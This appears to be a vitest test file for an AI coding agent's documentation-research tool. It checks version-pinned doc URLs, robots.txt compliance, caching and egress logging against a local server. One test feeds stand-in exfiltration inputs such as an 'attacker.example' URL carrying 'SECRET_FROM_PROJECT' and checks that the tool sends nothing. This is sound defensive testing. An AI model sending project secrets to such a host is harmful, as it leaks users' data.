import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { type Server, createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { EventLog, initSchema } from "@sekhemet/kernel";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  documentsVersion,
  pinnedDocsCandidates,
  pinnedTarget,
  readPinnedDocs,
  renderPinnedDocs,
} from "../src/research/pinned_docs.js";
import { HostPacer, PoliteFetcher, ResearchCache } from "../src/research/polite.js";
import { runResearchTool } from "../src/research/researcher.js";
import { workerWebDocs } from "../src/research/service.js";

/**
 * Design-stage DS-N9-8, -9, -12: documentation read at the version the
 * project pins. Every page comes from a real HTTP server on 127.0.0.1;
 * requests to the public documentation hosts are sent to it under their
 * host's name (the deps.dev precedent), and nothing leaves the machine.
 */

/**
 * The research policy's fetch sends through `policyFetch` (node:http): while
 * `net.to` is set, each request it allows goes to the local server under its
 * host's name, still through the real `policyFetch` and its record.
 */
const net = vi.hoisted(() => ({ to: undefined as string | undefined, seen: [] as string[] }));
vi.mock("@sekhemet/sandbox", async (importOriginal) => {
  const real = await importOriginal<typeof import("@sekhemet/sandbox")>();
  const policyFetch: typeof real.policyFetch = (policy, options) => {
    const send = real.policyFetch(policy, options);
    return (input, init) => {
      const u = new URL(String(input));
      if (net.to === undefined || real.policyRefusal(policy, u.hostname, options))
        return send(input, init);
      net.seen.push(`${u.hostname}${u.pathname}`);
      return send(`${net.to}/${u.hostname}${u.pathname}${u.search}`, init);
    };
  };
  return { ...real, policyFetch };
});

let server: Server;
let base: string;
let root: string;
const hits: string[] = [];
/** What the fake web serves, by `host/path`. */
let pages: Record<string, { type: string; body: string }> = {};

const html = (title: string, body: string) => ({
  type: "text/html",
  body: `<html><head><title>${title}</title></head><body>${body}</body></html>`,
});
const text = (body: string) => ({ type: "text/plain", body });

beforeEach(async () => {
  hits.length = 0;
  pages = {};
  server = createServer((req, res) => {
    const path = req.url ?? "";
    hits.push(path);
    const page = pages[path.slice(1)];
    if (!page) {
      res.writeHead(404, { "content-type": "text/plain" });
      res.end("not found");
      return;
    }
    res.writeHead(200, { "content-type": page.type });
    res.end(page.body);
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  root = mkdtempSync(join(tmpdir(), "sek-pinned-"));
  vi.stubEnv("SEKHEMET_RESEARCH_CACHE", join(root, "cache"));
  vi.stubEnv("SEKHEMET_CRAWL4AI", "off");
  vi.stubEnv("SEKHEMET_OFFLINE", undefined as unknown as string);
  vi.stubEnv("SEKHEMET_CONFIG_DIR", join(root, "cfg"));
  vi.stubEnv("SEKHEMET_USER_CONFIG", join(root, "user", "config.toml"));
});
afterEach(async () => {
  net.to = undefined;
  net.seen.length = 0;
  vi.unstubAllEnvs();
  rmSync(root, { recursive: true, force: true });
  await new Promise<void>((r) => server.close(() => r()));
});

/** The polite fetcher over the local server: public host names, real HTTP, robots, cache. */
function politeLocal(): PoliteFetcher {
  return new PoliteFetcher({
    fetch: (input, init) => {
      const u = new URL(String(input));
      return fetch(`${base}/${u.hostname}${u.pathname}${u.search}`, init);
    },
    pacer: new HostPacer({ now: () => 0, sleep: async () => undefined }),
    cache: new ResearchCache(join(root, "cache")),
  });
}
const pageText = (polite: PoliteFetcher) => async (u: string) => {
  const res = await polite.fetch(u, {}, true);
  return res.ok ? res.text() : undefined;
};

describe("documentation URLs at the pinned version (DS-N9-8)", () => {
  it("builds each ecosystem's versioned URLs, the versioned llms.txt before the origin's", () => {
    expect(
      pinnedDocsCandidates({ eco: "rust", name: "serde-json", version: "1.0.120" }).map(
        (c) => c.url,
      ),
    ).toEqual([
      "https://docs.rs/serde-json/1.0.120/serde_json/all.html",
      "https://docs.rs/serde-json/1.0.120/serde_json/",
      "https://docs.rs/serde-json/latest/serde_json/",
    ]);
    expect(
      pinnedDocsCandidates({ eco: "go", name: "github.com/spf13/cobra", version: "v1.8.0" }),
    ).toEqual([
      { url: "https://pkg.go.dev/github.com/spf13/cobra@v1.8.0", exact: true, version: "v1.8.0" },
      { url: "https://pkg.go.dev/github.com/spf13/cobra", exact: false, version: "latest" },
    ]);
    expect(
      pinnedDocsCandidates({
        eco: "python",
        name: "requests",
        version: "2.31.0",
        docsUrl: "https://requests.readthedocs.io/en/latest/",
      }).map((c) => [c.url, c.exact]),
    ).toEqual([
      ["https://requests.readthedocs.io/en/2.31.0/llms.txt", true],
      ["https://requests.readthedocs.io/en/2.31.0/", true],
      ["https://requests.readthedocs.io/en/v2.31.0/llms.txt", true],
      ["https://requests.readthedocs.io/en/v2.31.0/", true],
      ["https://requests.readthedocs.io/llms.txt", false],
      ["https://requests.readthedocs.io/en/latest/", false],
    ]);
    expect(
      pinnedDocsCandidates({ eco: "npm", name: "@scope/lib", version: "3.2.1" }).map((c) => c.url),
    ).toEqual([
      "https://unpkg.com/@scope/lib@3.2.1/llms.txt",
      "https://unpkg.com/@scope/lib@3.2.1/README.md",
    ]);
  });

  it("keeps a page at a pinned version as long as the cache keeps anything", () => {
    const inf = Number.POSITIVE_INFINITY;
    expect(ResearchCache.ttlFor("https://docs.rs/serde/1.0.200/serde/")).toBe(inf);
    expect(ResearchCache.ttlFor("https://pkg.go.dev/github.com/spf13/cobra@v1.8.0")).toBe(inf);
    expect(ResearchCache.ttlFor("https://unpkg.com/zod@3.22.4/README.md")).toBe(inf);
    expect(ResearchCache.ttlFor("crawl:https://requests.readthedocs.io/en/2.31.0/api/")).toBe(inf);
    expect(ResearchCache.ttlFor("https://docs.rs/serde/latest/serde/")).toBeLessThan(inf);
    expect(ResearchCache.ttlFor("https://requests.readthedocs.io/en/stable/")).toBeLessThan(inf);
  });

  it("finds the pin of a dependency in any ecosystem, and the Documentation URL a distribution declares", () => {
    const repo = join(root, "repo");
    mkdirSync(repo, { recursive: true });
    writeFileSync(
      join(repo, "Cargo.lock"),
      'version = 3\n\n[[package]]\nname = "serde"\nversion = "1.0.200"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n',
    );
    writeFileSync(
      join(repo, "Cargo.toml"),
      '[package]\nname = "app"\n\n[dependencies]\nserde = "1"\n',
    );
    execFileSync("python3", ["-m", "venv", "--without-pip", join(repo, ".venv")]);
    const lib = join(repo, ".venv", "lib");
    const site = join(lib, readdirSync(lib)[0] as string, "site-packages");
    const info = join(site, "requests-2.31.0.dist-info");
    mkdirSync(info, { recursive: true });
    writeFileSync(
      join(info, "METADATA"),
      "Metadata-Version: 2.1\nName: requests\nVersion: 2.31.0\nProject-URL: Documentation, https://requests.readthedocs.io/en/latest/\nProject-URL: Source, https://github.com/psf/requests\n\n# requests\n",
    );
    writeFileSync(
      join(info, "RECORD"),
      "requests/__init__.py,,\nrequests-2.31.0.dist-info/METADATA,,\n",
    );
    writeFileSync(join(info, "top_level.txt"), "requests\n");
    mkdirSync(join(site, "requests"));
    writeFileSync(join(site, "requests", "__init__.py"), "def get(url): ...\n");
    expect(pinnedTarget(repo, "serde")).toEqual({ eco: "rust", name: "serde", version: "1.0.200" });
    expect(pinnedTarget(repo, "requests")).toEqual({
      eco: "python",
      name: "requests",
      version: "2.31.0",
      docsUrl: "https://requests.readthedocs.io/en/latest/",
    });
    expect(pinnedTarget(repo, "no-such-thing")).toBeUndefined();
  });
});

describe("reading documentation at the pinned version (DS-N9-8, -9)", () => {
  const RTD = "requests.readthedocs.io";
  const target = {
    eco: "python" as const,
    name: "requests",
    version: "2.31.0",
    docsUrl: `https://${RTD}/en/stable/`,
  };

  it("prefers the page at the pinned version, and labels and demotes another", async () => {
    pages[`${RTD}/en/2.31.0/`] = html(
      "Requests 2.31.0",
      "<h1>Requests</h1><p>Intro.</p><h2>Timeouts</h2><p>Pass timeout= to get(); a Session keeps it.</p>",
    );
    pages[`${RTD}/en/stable/`] = html(
      "Requests stable",
      "<h1>Requests</h1><p>Intro.</p><h2>Timeouts</h2><p>In 3.0 timeout is set on the Client instead.</p>",
    );
    const r = await readPinnedDocs(target, "timeout Session", pageText(politeLocal()), {
      maxPages: 2,
    });
    expect(r.pages.map((p) => [p.url, p.exact])).toEqual([
      [`https://${RTD}/en/2.31.0/`, true],
      [`https://${RTD}/en/stable/`, false],
    ]);
    expect(r.pages[0]?.label).toBeUndefined();
    expect(r.pages[1]?.label).toBe("[docs for stable; project pins 2.31.0]");
    expect(r.pages[0]?.excerpts[0]).toMatchObject({ heading: "Timeouts", anchor: "timeouts" });
    const out = renderPinnedDocs(r);
    expect(out.indexOf("Pass timeout=")).toBeLessThan(out.indexOf("[docs for stable"));
    expect(out).toMatch(/\/en\/2\.31\.0\/#timeouts/);
  });

  it("gives at most five excerpts for the whole read, the pinned page's first", async () => {
    const sections = (word: string) =>
      Array.from({ length: 6 }, (_, i) => `<h2>Timeout ${i}</h2><p>${word} timeout ${i}.</p>`).join(
        "",
      );
    pages[`${RTD}/en/2.31.0/`] = html("Requests 2.31.0", sections("Pinned"));
    pages[`${RTD}/en/stable/`] = html("Requests stable", sections("Stable"));
    const r = await readPinnedDocs(target, "timeout", pageText(politeLocal()), { maxPages: 2 });
    const all = r.pages.flatMap((p) => p.excerpts);
    expect(all).toHaveLength(5);
    expect(all.every((e) => e.text.includes("Pinned"))).toBe(true);
  });

  it("reads another version only when the pinned one has too few pages, and says so", async () => {
    pages[`${RTD}/en/stable/`] = html(
      "Requests",
      "<h2>Timeouts</h2><p>timeout on the Session.</p>",
    );
    const r = await readPinnedDocs(target, "timeout", pageText(politeLocal()), { maxPages: 1 });
    expect(r.pages).toHaveLength(1);
    expect(r.pages[0]?.label).toBe("[docs for stable; project pins 2.31.0]");
    // The pinned version's URLs were each tried first.
    const tried = hits.filter((h) => !h.endsWith("/robots.txt"));
    expect(tried.indexOf(`/${RTD}/en/2.31.0/`)).toBeLessThan(tried.indexOf(`/${RTD}/en/stable/`));
  });

  it("does not fetch a page robots.txt disallows", async () => {
    pages["docs.rs/robots.txt"] = text("User-agent: *\nDisallow: /serde/\n");
    pages["docs.rs/serde/1.0.200/serde/"] = html("serde", "<h2>Serialize</h2><p>secret</p>");
    const r = await readPinnedDocs(
      { eco: "rust", name: "serde", version: "1.0.200" },
      "Serialize",
      pageText(politeLocal()),
    );
    expect(r.pages).toEqual([]);
    expect(hits).toEqual(["/docs.rs/robots.txt"]);
  });

  it("maps a Rust symbol to its page through all.html", async () => {
    pages["docs.rs/serde_json/1.0.120/serde_json/all.html"] = html(
      "All items",
      '<a href="struct.Deserializer.html">Deserializer</a><a href="enum.Value.html">Value</a><a href="fn.from_str.html">from_str</a>',
    );
    pages["docs.rs/serde_json/1.0.120/serde_json/enum.Value.html"] = html(
      "Value in serde_json",
      "<h1>Enum Value</h1><p>Represents any valid JSON value.</p><h2>Variants</h2><p>Null, Bool, Number, String, Array, Object of a Value map.</p>",
    );
    const r = await readPinnedDocs(
      { eco: "rust", name: "serde_json", version: "1.0.120" },
      "What variants does Value have?",
      pageText(politeLocal()),
      { maxPages: 1 },
    );
    expect(r.pages[0]?.url).toBe("https://docs.rs/serde_json/1.0.120/serde_json/enum.Value.html");
    expect(r.pages[0]?.exact).toBe(true);
    expect(r.pages[0]?.excerpts.map((e) => e.heading)).toContain("Variants");
  });
});

describe("documentsVersion: a page's URL names the exact version (DS-N9-24)", () => {
  it("accepts the versioned addresses of each ecosystem and nothing else", () => {
    const yes: [string, Parameters<typeof documentsVersion>[1], string, string][] = [
      ["https://docs.rs/syn/2.0.50/syn/fn.parse2.html", "rust", "syn", "2.0.50"],
      [
        "https://pkg.go.dev/github.com/spf13/cobra@v1.8.0",
        "go",
        "github.com/spf13/cobra",
        "v1.8.0",
      ],
      ["https://requests.readthedocs.io/en/2.31.0/api/", "python", "requests", "2.31.0"],
      ["https://requests.readthedocs.io/en/v2.31.0/", "python", "requests", "2.31.0"],
      ["https://unpkg.com/zod@3.23.8/README.md", "npm", "zod", "3.23.8"],
    ];
    const no: [string, Parameters<typeof documentsVersion>[1], string, string][] = [
      ["https://docs.rs/syn/latest/syn/", "rust", "syn", "2.0.50"],
      ["https://docs.rs/syn/1.0.109/syn/", "rust", "syn", "2.0.50"],
      ["https://pkg.go.dev/github.com/spf13/cobra", "go", "github.com/spf13/cobra", "v1.8.0"],
      ["https://requests.readthedocs.io/en/latest/", "python", "requests", "2.31.0"],
      ["https://requests.readthedocs.io/en/2.31.0x/", "python", "requests", "2.31.0"],
      ["https://unpkg.com/zod@3.22.0/README.md", "npm", "zod", "3.23.8"],
      ["https://zod.dev/", "npm", "zod", "3.23.8"],
      ["https://unpkg.com/zod@3.23.8/README.md", "npm", "zod", "3.22.0, 3.23.8"],
    ];
    for (const [url, eco, name, version] of yes)
      expect(documentsVersion(url, eco, name, version), url).toBe(true);
    for (const [url, eco, name, version] of no)
      expect(documentsVersion(url, eco, name, version), url).toBe(false);
  });
});

describe("the Worker's and the Researcher's docs read the pinned version (DS-N9-9, -12)", () => {
  /** A repository that pins zod 3.22.4, installed. */
  function npmRepo(): string {
    const repo = join(root, "repo");
    mkdirSync(join(repo, "node_modules", "zod"), { recursive: true });
    mkdirSync(join(repo, ".sekhemet"), { recursive: true });
    writeFileSync(
      join(repo, "package.json"),
      JSON.stringify({ name: "app", dependencies: { zod: "^3.22.0" } }),
    );
    writeFileSync(
      join(repo, "node_modules", "zod", "package.json"),
      JSON.stringify({ name: "zod", version: "3.22.4" }),
    );
    return repo;
  }
  const writeUser = (body: string) => {
    const file = join(root, "user", "config.toml");
    mkdirSync(dirname(file), { recursive: true });
    writeFileSync(file, body);
  };
  const ZOD_README =
    "# Zod\n\nIntro.\n\n## Objects\n\nUse z.object({ ... }) and .strict() to refuse unknown keys.\n\n## Unions\n\nz.union([a, b]).\n";

  it("sends nothing while research is off", async () => {
    const repo = npmRepo();
    pages["unpkg.com/zod@3.22.4/README.md"] = text(ZOD_README);
    net.to = base;
    const db = new DatabaseSync(join(repo, ".sekhemet", "events.db"));
    initSchema(db);
    const log = new EventLog(db);
    expect(await workerWebDocs(repo, { log })).toBeUndefined();
    expect(hits).toEqual([]);
    db.close();
  });

  it("reads through the research policy with research on, each request a harness/egress event", async () => {
    const repo = npmRepo();
    writeUser('[network]\nresearch = "yes"\n');
    pages["unpkg.com/zod@3.22.4/README.md"] = text(ZOD_README);
    net.to = base;
    const db = new DatabaseSync(join(repo, ".sekhemet", "events.db"));
    initSchema(db);
    const log = new EventLog(db);
    const docs = await workerWebDocs(repo, { log });
    const out = (await docs?.("zod", "object strict unknown keys")) ?? "";
    expect(out).toMatch(/zod@3\.22\.4/);
    expect(out).toMatch(/\.strict\(\) to refuse unknown keys/);
    expect(out).toMatch(/unpkg\.com\/zod@3\.22\.4\/README\.md#objects/);
    // Every request the resolver sent passed the research policy, and each is on the ledger.
    expect(net.seen).toContain("unpkg.com/zod@3.22.4/README.md");
    const egress = await log.getEventsByTypes(["harness/egress"]);
    expect(egress.length).toBe(net.seen.length);
    expect(egress.every((e) => (e.payload as { purpose: string }).purpose === "research")).toBe(
      true,
    );
    expect(hits).toContain("/unpkg.com/zod@3.22.4/README.md");
    db.close();
  });

  it("sends nothing for a URL or a name the project neither pins nor has a known home for (DS-N9-12)", async () => {
    const repo = npmRepo();
    writeUser('[network]\nresearch = "yes"\n');
    net.to = base;
    const db = new DatabaseSync(join(repo, ".sekhemet", "events.db"));
    initSchema(db);
    const log = new EventLog(db);
    const docs = await workerWebDocs(repo, { log });
    expect(docs).toBeDefined();
    for (const library of [
      `${base}/p?d=SECRET_FROM_PROJECT`,
      "https://attacker.example/p?d=SECRET_FROM_PROJECT",
      "attacker.example/p",
      "npm:https://attacker.example/x",
      "left-pad-not-a-dependency",
    ])
      expect(await docs?.(library, "object strict")).toBe("");
    expect(hits).toEqual([]);
    expect(net.seen).toEqual([]);
    expect(await log.getEventsByTypes(["harness/egress"])).toEqual([]);
    db.close();
  });

  it("gives the Researcher's read_docs the pinned page, cited by its URL", async () => {
    const repo = npmRepo();
    pages["unpkg.com/zod@3.22.4/README.md"] = text(ZOD_README);
    const r = await runResearchTool(
      { id: "c1", name: "read_docs", arguments: { library: "zod", question: "union of schemas" } },
      { repoPath: repo, web: { polite: politeLocal() } },
    );
    expect(r.text).toMatch(/z\.union/);
    expect(r.source?.ref).toBe("https://unpkg.com/zod@3.22.4/README.md");
    expect(r.source?.kind).toBe("documentation");
  });

  it("keeps the brief's deep question from reading the repository's pins", async () => {
    const repo = npmRepo();
    pages["unpkg.com/zod@3.22.4/README.md"] = text(ZOD_README);
    const r = await runResearchTool(
      { id: "c1", name: "read_docs", arguments: { library: "zod", question: "union" } },
      { repoPath: repo, repository: false, web: { polite: politeLocal() } },
    );
    expect(hits.some((h) => h.includes("zod@3.22.4"))).toBe(false);
    expect(r.text).not.toMatch(/3\.22\.4/);
  });
});
